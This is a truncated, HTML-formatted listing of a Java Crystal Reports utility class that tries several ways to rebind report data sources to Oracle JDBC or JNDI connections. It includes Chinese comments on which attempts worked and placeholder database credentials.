class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br></pre></td><td class="code"><pre><span class="line">package dh.report;</span><br><span class="line"></span><br><span class="line">import java.util.Iterator;</span><br><span class="line">import java.util.Map;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpSession;</span><br><span class="line"></span><br><span class="line">import com.crystaldecisions.report.web.viewer.ReportExportControl;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.application.DBOptions;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.application.DatabaseController;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.application.ReportClientDocument;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.ConnectionInfo;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.ConnectionInfoKind;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.ConnectionInfos;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.Fields;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.IConnectionInfo;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.ITable;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.ParameterField;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.ParameterFieldDiscreteValue;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.Tables;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.data.Values;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.lib.PropertyBag;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.lib.PropertyBagHelper;</span><br><span class="line">import com.crystaldecisions.sdk.occa.report.lib.ReportSDKException;</span><br><span class="line"></span><br><span class="line">public class ReportUtil &#123;</span><br><span class="line"></span><br><span class="line">    public static Object getReportSource(HttpSession session, String reportName) throws ReportSDKException &#123;</span><br><span class="line">        System.out.println(&quot;getReportSource() ---------- start ----------------- \n reportName=&quot; + reportName</span><br><span class="line">                + &quot;\n session=&quot; + session);</span><br><span class="line">        //      if(session==null || reportName==null)&#123;</span><br><span class="line">        //          return null ;</span><br><span class="line">        //      &#125;</span><br><span class="line"></span><br><span class="line">        Object reportSource = session.getAttribute(&quot;reportSource&quot;);</span><br><span class="line"></span><br><span class="line">        if (reportSource == null) &#123;</span><br><span class="line">            System.out.println(&quot;getReportSource() ......... reportSource == null ,  create reportSource&quot;);</span><br><span class="line">            ReportClientDocument reportClientDoc = new ReportClientDocument();</span><br><span class="line">            reportClientDoc.open(reportName, 0);</span><br><span class="line">            reportSource = reportClientDoc.getReportSource();</span><br><span class="line">            session.setAttribute(&quot;reportSource&quot;, reportSource);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;getReportSource() ---------- finish ----------------- \n reportSource=&quot; + reportSource);</span><br><span class="line">        return reportSource;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static ParameterField createParameter(String parameterName, Object parameterValue) &#123;</span><br><span class="line">        System.out.println(&quot;createParameter() ---------- start ----------------- \t parameterName=&quot; + parameterName</span><br><span class="line">                + &quot;\t parameterValue=&quot; + parameterValue);</span><br><span class="line">        ParameterField pfield = new ParameterField();</span><br><span class="line">        pfield.setName(parameterName);</span><br><span class="line">        pfield.setReportName(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">        Values vals = new Values();</span><br><span class="line">        ParameterFieldDiscreteValue pfieldDV = new ParameterFieldDiscreteValue();</span><br><span class="line">        pfieldDV.setValue(parameterValue);</span><br><span class="line">        vals.add(pfieldDV);</span><br><span class="line"></span><br><span class="line">        pfield.setCurrentValues(vals);</span><br><span class="line"></span><br><span class="line">        return pfield;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static Fields prepareParameter(String reportTemplateFileName, Map parameterMap) &#123;</span><br><span class="line">        //      logger.info(&quot;prepareParameter() ---------- start ----------------- \t parameterName=&quot; + parameterName + &quot;\t parameterValue=&quot; + parameterValue) ;</span><br><span class="line">        System.out.println(&quot;prepareParameter() ---------- start ----------------- \t reportTemplateFileName=&quot;</span><br><span class="line">                + reportTemplateFileName + &quot;\t parameterMap=&quot; + parameterMap);</span><br><span class="line"></span><br><span class="line">        Fields fields = null;</span><br><span class="line"></span><br><span class="line">        if (parameterMap != null) &#123;</span><br><span class="line">            fields = new Fields();</span><br><span class="line">            for (Iterator itr = parameterMap.keySet().iterator(); itr.hasNext();) &#123;</span><br><span class="line">                String key = (String) itr.next();</span><br><span class="line">                if (key != null) &#123;</span><br><span class="line">                    Object value = parameterMap.get(key);</span><br><span class="line">                    fields.add(ReportUtil.createParameter(key, value));</span><br><span class="line">                    System.out.println(&quot;put parameter &quot; + key + &quot; : &quot; + value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;prepareParameter() ---------- Finish ----------------- \t fields=&quot; + fields);</span><br><span class="line"></span><br><span class="line">        return fields;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*</span><br><span class="line">     // ref: Crystal report official tutorial</span><br><span class="line">    public static void changeDataSource(ReportClientDocument rcd) throws ReportSDKException</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;changeDataSource() ---------- start ----------------- \t rcd=&quot; + rcd);</span><br><span class="line">      DatabaseController databaseController = rcd.getDatabaseController();</span><br><span class="line">      ConnectionInfos connectionInfos = (ConnectionInfos)databaseController.getConnectionInfos(null);</span><br><span class="line">      IConnectionInfo oldConnectionInfo = connectionInfos.getConnectionInfo(0);</span><br><span class="line">      IConnectionInfo newConnectionInfo = new ConnectionInfo();</span><br><span class="line"></span><br><span class="line">      newConnectionInfo.setKind(ConnectionInfoKind.SQL);</span><br><span class="line"></span><br><span class="line">      PropertyBag newProperties = new PropertyBag();</span><br><span class="line">      newProperties.putStringValue(&quot;DSN&quot;, &quot;Xtreme Sample Database 2005&quot;);</span><br><span class="line">      newProperties.put(&quot;UseDSNProperties&quot;, false);</span><br><span class="line">      newProperties.putStringValue(PropertyBagHelper.CONNINFO_SERVER_NAME, &quot;Xtreme Sample Database 2005&quot;);</span><br><span class="line">      newProperties.putStringValue(PropertyBagHelper.CONNINFO_SERVER_TYPE, &quot;ODBC (RDO)&quot;);</span><br><span class="line">      newProperties.putStringValue(PropertyBagHelper.CONNINFO_DATABASE_DLL, &quot;crdb_odbc.dll&quot;);</span><br><span class="line"></span><br><span class="line">      newConnectionInfo.setAttributes(newProperties);</span><br><span class="line">      newConnectionInfo.setUserName(&quot;guest&quot;);</span><br><span class="line">      newConnectionInfo.setPassword(&quot;bobobo&quot;);</span><br><span class="line"></span><br><span class="line">      try</span><br><span class="line">      &#123;</span><br><span class="line">        databaseController.replaceConnection(oldConnectionInfo, newConnectionInfo, null, DBOptions._useDefault);</span><br><span class="line">      &#125;</span><br><span class="line">      catch (ReportSDKException error)</span><br><span class="line">      &#123;</span><br><span class="line">        System.out.println(error.getSDKError());</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      System.out.println(&quot;changeDataSource() ---------- finish ----------------- &quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">    // Change the document&#x27;s all table&#x27;s source to a JNDI， 实际上是不行的</span><br><span class="line">    // ref: http://scn.sap.com/thread/1688419</span><br><span class="line">    public static void changeDB(ReportClientDocument rcd, String reportJndiName) &#123;</span><br><span class="line">        System.out.println(&quot;changeDB() ---------- start ----------------- \t rcd=&quot; + rcd + &quot;\t change to JNDI:&quot;</span><br><span class="line">                + reportJndiName);</span><br><span class="line">        DatabaseController databaseController;</span><br><span class="line">        try &#123;</span><br><span class="line">            databaseController = rcd.getDatabaseController();</span><br><span class="line"></span><br><span class="line">            IConnectionInfo connectionInfo = new ConnectionInfo();</span><br><span class="line">            PropertyBag propertyBag = new PropertyBag();</span><br><span class="line">            propertyBag.put(&quot;JNDI Datasource Name&quot;, reportJndiName);</span><br><span class="line">            propertyBag.put(&quot;Use JDBC&quot;, &quot;true&quot;);</span><br><span class="line">            // by Ricky</span><br><span class="line">            //      propertyBag.put(&quot;Database DLL&quot;, DATABASE_DLL); // required!!! (but we don&#x27;t actually provide a DLL, or even run in windows)</span><br><span class="line">            propertyBag.put(PropertyBagHelper.CONNINFO_DATABASE_DLL, &quot;crdb_oracle.dll&quot;);</span><br><span class="line"></span><br><span class="line">            connectionInfo.setAttributes(propertyBag);</span><br><span class="line">            connectionInfo.setKind(ConnectionInfoKind.SQL);</span><br><span class="line"></span><br><span class="line">            ConnectionInfos connectionInfos = databaseController.getConnectionInfos(null);</span><br><span class="line">            IConnectionInfo oldConnectionInfo = connectionInfos.getConnectionInfo(0);</span><br><span class="line"></span><br><span class="line">            databaseController.replaceConnection(oldConnectionInfo, connectionInfo, null, DBOptions._useDefault);</span><br><span class="line">        &#125; catch (ReportSDKException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(&quot;changeDB() ---------- finish ----------------- &quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  // 全局性转换登录信息</span><br><span class="line">    public static void changeDB2(ReportClientDocument rcd, String reportJndiName) &#123;</span><br><span class="line">        String DBUSERNAME = &quot;dhdba&quot;;</span><br><span class="line">        String DBPASSWORD = &quot;password&quot;;</span><br><span class="line">        String CONNECTION_STRING = &quot;jdbc:oracle:thin:@server:1521:sid&quot;;</span><br><span class="line">        String SERVERTYPE = &quot;JDBC (JNDI)&quot;;</span><br><span class="line">        String DATABASE_DLL = &quot;crdb_oracle.dll&quot;;</span><br><span class="line">        String DATABASE = &quot;server&quot;;</span><br><span class="line">        final String TRUSTEDCON = &quot;false&quot;;</span><br><span class="line">        String DBCLASSNAME = &quot;oracle.jdbc.driver.OracleDriver&quot;;</span><br><span class="line">        String USEJDBC = &quot;true&quot;;</span><br><span class="line">        String SERVERNAME = &quot;jdbc:oracle:thin:@server:1521:sid&quot;;</span><br><span class="line">        String CONNECTIONURL = &quot;jdbc:oracle:thin:@server:1521:sid&quot;;</span><br><span class="line">        String SERVER = &quot;server&quot;;</span><br><span class="line">        final String DATABASE_NAME = &quot;sid&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            System.out.println(&quot;change to &quot; + reportJndiName);</span><br><span class="line">            // Set DB Username and Password</span><br><span class="line">            //rcd.getDatabaseController().logon(DBUSERNAME, DBPASSWORD);</span><br><span class="line"></span><br><span class="line">            // Create the two connectioninfo objects to use</span><br><span class="line">            IConnectionInfo oldConnectionInfo = new ConnectionInfo();</span><br><span class="line">            IConnectionInfo newConnectionInfo = new ConnectionInfo();</span><br><span class="line"></span><br><span class="line">            // Assign the old Connection info to the reports current info</span><br><span class="line">            DatabaseController dbController = rcd.getDatabaseController();</span><br><span class="line">            oldConnectionInfo = dbController.getConnectionInfos(null).getConnectionInfo(0);</span><br><span class="line"></span><br><span class="line">            // Create a new propertybag for the new location</span><br><span class="line">            PropertyBag boPropertyBag1 = new PropertyBag();</span><br><span class="line"></span><br><span class="line">            // Set new table logon properties</span><br><span class="line">            boPropertyBag1.put(&quot;JDBC Connection String&quot;, CONNECTION_STRING);</span><br><span class="line">            boPropertyBag1.put(&quot;Trusted_Connection&quot;, TRUSTEDCON);</span><br><span class="line">            boPropertyBag1.put(&quot;Server Type&quot;, SERVERTYPE);</span><br><span class="line">            boPropertyBag1.put(&quot;Database DLL&quot;, DATABASE_DLL);</span><br><span class="line">            boPropertyBag1.put(&quot;Database&quot;, DATABASE);</span><br><span class="line">            boPropertyBag1.put(&quot;Database Class Name&quot;, DBCLASSNAME);</span><br><span class="line">            boPropertyBag1.put(&quot;Use JDBC&quot;, USEJDBC);</span><br><span class="line">            boPropertyBag1.put(&quot;Database Name&quot;, DATABASE_NAME);</span><br><span class="line">            boPropertyBag1.put(&quot;Server Name&quot;, SERVERNAME);</span><br><span class="line">            boPropertyBag1.put(&quot;Connection URL&quot;, CONNECTIONURL);</span><br><span class="line">            boPropertyBag1.put(&quot;Server&quot;, SERVER);</span><br><span class="line"></span><br><span class="line">            // Assign the properties to the connection info</span><br><span class="line">            newConnectionInfo.setAttributes(boPropertyBag1);</span><br><span class="line"></span><br><span class="line">            // Set the DB Username and Pwd</span><br><span class="line">            newConnectionInfo.setUserName(DBUSERNAME);</span><br><span class="line">            newConnectionInfo.setPassword(DBPASSWORD);</span><br><span class="line"></span><br><span class="line">            // The Kind of connectionInfos is SQL</span><br><span class="line">            newConnectionInfo.setKind(ConnectionInfoKind.SQL);</span><br><span class="line"></span><br><span class="line">            // set the parameters to replace.</span><br><span class="line">            // The 4 options are:</span><br><span class="line">            // _doNotVerifyDB</span><br><span class="line">            // _ignoreCurrentTableQualifiers</span><br><span class="line">            // _mapFieldByRowsetPosition</span><br><span class="line">            // _useDefault</span><br><span class="line">            int replaceParams = DBOptions._ignoreCurrentTableQualifiers + DBOptions._doNotVerifyDB;</span><br><span class="line">            //int replaceParams = DBOptions._useDefault;</span><br><span class="line"></span><br><span class="line">            // Now replace the connections</span><br><span class="line">            dbController.replaceConnection(oldConnectionInfo, newConnectionInfo, null, replaceParams);</span><br><span class="line"></span><br><span class="line">            //Store the report source in session, will be used by the CrystalReportViewer.</span><br><span class="line"></span><br><span class="line">        &#125; catch (ReportSDKException ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125; catch (Exception ex) &#123;</span><br><span class="line">            ex.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  // 对Report里每一Table进行转换</span><br><span class="line">    public static void changeDB3(ReportClientDocument rcd, String reportJndiName) &#123;</span><br><span class="line">        final String TABLE_NAME_QUALIFIER = &quot;dhdba.&quot;;</span><br><span class="line">        final String DBUSERNAME = &quot;dhdba&quot;;</span><br><span class="line">        final String DBPASSWORD = &quot;password&quot;;</span><br><span class="line">        String CONNECTION_STRING = &quot;jdbc:oracle:thin:@server:1521:sid&quot;;</span><br><span class="line">        final String DATABASE_NAME = &quot;dhdba&quot;;</span><br><span class="line">        final String URI = &quot;!oracle.jdbc.driver.OracleDriver!jdbc:oracle:thin:@server:1521:sid&quot;;</span><br><span class="line">        String SERVERNAME = &quot;jdbc:oracle:thin:@server:1521:sid&quot;;</span><br><span class="line">        final String DATABASE_DLL = &quot;crdb_jdbc.dll&quot;;</span><br><span class="line">        String DBCLASSNAME = &quot;oracle.jdbc.driver.OracleDriver&quot;;</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            DatabaseController dbController = rcd.getDatabaseController();</span><br><span class="line">            Tables tables = dbController.getDatabase().getTables();</span><br><span class="line">            for (int i = 0; i &lt; tables.size(); i++) &#123;</span><br><span class="line"></span><br><span class="line">                ITable table = tables.getTable(i);</span><br><span class="line"></span><br><span class="line">                //Keep existing name and alias.</span><br><span class="line">                table.setName(table.getName());</span><br><span class="line">                table.setAlias(table.getAlias());</span><br><span class="line">                System.out.println(&quot;getName &quot; + table.getName());</span><br><span class="line">                System.out.println(&quot;getAlias&quot; + table.getAlias());</span><br><span class="line">                //Change properties that are different from the original datasource.</span><br><span class="line">                table.setQualifiedName(TABLE_NAME_QUALIFIER + table.getName());</span><br><span class="line"></span><br><span class="line">                //Change connection information properties.</span><br><span class="line">                IConnectionInfo connectionInfo = table.getConnectionInfo();</span><br><span class="line">                connectionInfo.getAttributes().clear();</span><br><span class="line">                //Set new table connection property attributes.</span><br><span class="line">                PropertyBag propertyBag = new PropertyBag();</span><br><span class="line"></span><br><span class="line">                //Overwrite any existing properties with updated values.</span><br><span class="line">                propertyBag.put(&quot;Trusted_Connection&quot;, &quot;false&quot;);</span><br><span class="line">                propertyBag.put(&quot;Server Name&quot;, SERVERNAME); //Optional property.</span><br><span class="line">                propertyBag.put(&quot;Connection String&quot;, CONNECTION_STRING);</span><br><span class="line">                propertyBag.put(&quot;Database Name&quot;, DATABASE_NAME);</span><br><span class="line">                //propertyBag.put(&quot;Server Type&quot;, &quot;JDBC (JNDI)&quot;);</span><br><span class="line">                propertyBag.put(&quot;URI&quot;, URI);</span><br><span class="line">                propertyBag.put(&quot;Use JDBC&quot;, &quot;false&quot;);</span><br><span class="line">                propertyBag.put(&quot;JDBC Connection String&quot;, CONNECTION_STRING);</span><br><span class="line">                propertyBag.put(&quot;Database Class Name&quot;, DBCLASSNAME);</span><br><span class="line">                propertyBag.put(&quot;Database DLL&quot;, DATABASE_DLL);</span><br><span class="line">                propertyBag.put(&quot;Connection Name&quot;, CONNECTION_STRING);</span><br><span class="line">                propertyBag.put(&quot;PreQEServerName&quot;, &quot;server&quot;);</span><br><span class="line">                propertyBag.put(&quot;PASSWORD&quot;, &quot;password&quot;);</span><br><span class="line"></span><br><span class="line">                connectionInfo.setAttributes(propertyBag);</span><br><span class="line"></span><br><span class="line">                //Set database username and password.</span><br><span class="line">                //NOTE: Even if these the username and password properties don&#x27;t change when switching databases, the</span><br><span class="line">                //database password is *not* saved in the report and must be set at runtime if the database is secured.</span><br><span class="line">                connectionInfo.setUserName(DBUSERNAME);</span><br><span class="line">                connectionInfo.setPassword(DBPASSWORD);</span><br><span class="line">                connectionInfo.setKind(ConnectionInfoKind.SQL);</span><br><span class="line"></span><br><span class="line">                table.setConnectionInfo(connectionInfo);</span><br><span class="line">                rcd.getDatabaseController().logon(DBUSERNAME, DBPASSWORD);</span><br><span class="line">                //Update old table in the report with the new table.</span><br><span class="line">                dbController.setTableLocation(table, tables.getTable(i));</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; catch (ReportSDKException e) &#123;</span><br><span class="line">            // TODO Auto-generated catch block</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void changeDB4(ReportClientDocument rcd, String reportJndiName, ReportExportControl exportControl)</span><br><span class="line">            throws ReportSDKException &#123;</span><br><span class="line">        IConnectionInfo oldConnectionInfo = new ConnectionInfo();</span><br><span class="line">        IConnectionInfo newConnectionInfo = new ConnectionInfo();</span><br><span class="line"></span><br><span class="line">        String DBUSERNAME = &quot;dhdba&quot;;</span><br><span class="line">        String DBPASSWORD = &quot;password&quot;;</span><br><span class="line">        String CONNECTION_STRING = &quot;jdbc:oracle:thin:@server:1521:sid&quot;;</span><br><span class="line">        String SERVERTYPE = &quot;JDBC (JNDI)&quot;;</span><br><span class="line">        String DATABASE_DLL = &quot;crdb_oracle.dll&quot;;</span><br><span class="line">        String DATABASE = &quot;server&quot;;</span><br><span class="line">        final String TRUSTEDCON = &quot;false&quot;;</span><br><span class="line">        String DBCLASSNAME = &quot;oracle.jdbc.driver.OracleDriver&quot;;</span><br><span class="line">        String USEJDBC = &quot;true&quot;;</span><br><span class="line">        String SERVERNAME = &quot;jdbc:oracle:thin:@server:1521:sid&quot;;</span><br><span class="line">        String CONNECTIONURL = &quot;jdbc:oracle:thin:@server:1521:sid&quot;;</span><br><span class="line">        String SERVER = &quot;server&quot;;</span><br><span class="line">        final String DATABASE_NAME = &quot;sid&quot;;</span><br><span class="line"></span><br><span class="line">        // Assign the old Connection info to the reports current info</span><br><span class="line">        DatabaseController dbController = rcd.getDatabaseController();</span><br><span class="line">        oldConnectionInfo = dbController.getConnectionInfos(null).getConnectionInfo(0);</span><br><span class="line"></span><br><span class="line">        // Create a new propertybag for the new location</span><br><span class="line">        PropertyBag boPropertyBag1 = new PropertyBag();</span><br><span class="line"></span><br><span class="line">        // Set new table logon properties</span><br><span class="line">        boPropertyBag1.put(&quot;JDBC Connection String&quot;, CONNECTION_STRING);</span><br><span class="line">        boPropertyBag1.put(&quot;Trusted_Connection&quot;, TRUSTEDCON);</span><br><span class="line">        boPropertyBag1.put(&quot;Server Type&quot;, SERVERTYPE);</span><br><span class="line">        boPropertyBag1.put(&quot;Database DLL&quot;, DATABASE_DLL);</span><br><span class="line">        boPropertyBag1.put(&quot;Database&quot;, DATABASE);</span><br><span class="line">        boPropertyBag1.put(&quot;Database Class Name&quot;, DBCLASSNAME);</span><br><span class="line">        boPropertyBag1.put(&quot;Use JDBC&quot;, USEJDBC);</span><br><span class="line">        boPropertyBag1.put(&quot;Database Name&quot;, DATABASE_NAME);</span><br><span class="line">        boPropertyBag1.put(&quot;Server Name&quot;, SERVERNAME);</span><br><span class="line">        boPropertyBag1.put(&quot;Connection URL&quot;, CONNECTIONURL);</span><br><span class="line">        boPropertyBag1.put(&quot;Server&quot;, SERVER);</span><br><span class="line"></span><br><span class="line">        // Assign the properties to the connection info</span><br><span class="line">        newConnectionInfo.setAttributes(boPropertyBag1);</span><br><span class="line"></span><br><span class="line">        // Set the DB Username and Pwd</span><br><span class="line">        newConnectionInfo.setUserName(DBUSERNAME);</span><br><span class="line">        newConnectionInfo.setPassword(DBPASSWORD);</span><br><span class="line"></span><br><span class="line">        // The Kind of connectionInfos is SQL</span><br><span class="line">        newConnectionInfo.setKind(ConnectionInfoKind.SQL);</span><br><span class="line"></span><br><span class="line">        // set the parameters to replace.</span><br><span class="line">        // The 4 options are:</span><br><span class="line">        // _doNotVerifyDB</span><br><span class="line">        // _ignoreCurrentTableQualifiers</span><br><span class="line">        // _mapFieldByRowsetPosition</span><br><span class="line">        // _useDefault</span><br><span class="line">        int replaceParams = DBOptions._ignoreCurrentTableQualifiers + DBOptions._doNotVerifyDB;</span><br><span class="line"></span><br><span class="line">        ConnectionInfos infos = new ConnectionInfos();</span><br><span class="line">        infos.add(newConnectionInfo);</span><br><span class="line">        Iterator it = infos.iterator();</span><br><span class="line">        while (it.hasNext()) &#123;</span><br><span class="line">            ConnectionInfo info = (ConnectionInfo) it.next();</span><br><span class="line">            PropertyBag bag = info.getAttributes();</span><br><span class="line">            System.out.println(&quot;EEEEE &quot; + bag.getStringValue(&quot;JDBC Connection String&quot;));</span><br><span class="line">            System.out.println(&quot;EEEEE &quot; + info.getPassword());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        exportControl.setDatabaseLogonInfos(infos);  // 尝试用exportControl设置登录信息</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  // 唯有这个方法可行，其他都失败了</span><br><span class="line">    public static void switch_tables(DatabaseController databaseController) throws ReportSDKException &#123;</span><br><span class="line"></span><br><span class="line">        final String 